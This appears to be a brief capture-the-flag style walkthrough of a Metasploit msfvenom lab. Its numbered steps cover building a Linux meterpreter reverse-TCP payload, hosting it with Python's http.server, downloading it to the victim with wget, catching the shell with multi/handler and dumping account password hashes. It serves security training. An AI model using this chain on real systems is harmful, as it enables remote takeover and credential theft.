# Metasploit: Msfvenom
1. as the name suggests we have to use msfvenom here 
2. there is too much information given in the questions 
3. so we have to ssh in the machine and get the root privs to execute the payload that we make using msfvenom on our local machine
4. we have to make the payload for a linux machine so we will be giving the format as elf
5. we know LHOST , LPORT , FORMAT . payload still left 
6. we will be using /linux/x86/meterpreter/reverse_tcp here
7. after creating the payload we have to move the payload to the victim machine will be doing this via http.server python utility
8. python3 -m http.server 9000
9. downloaded the payload via wget <link of the file on the self hosted server >
10. the downloaded payload is not a executable so we have to make it a executable first using chmod +x rishabh.elf
11. now start the exploit/multi/handler in the metasploit and configure it with 	LHOST, LPORT, PAYLOAD.
12. NOTE:  the LPORT must be the same here that we had set while making tha payload in msfvenom ie 9999
13. now just execute the file on the target machine and here we get a meterpreter shell. 
14. just background the session and search for the post/linux/gather/hashdump and initialize it with the session id and BOOM 
15. here are the hashes of all the accounts on the machine 
16. TASK COMPLETED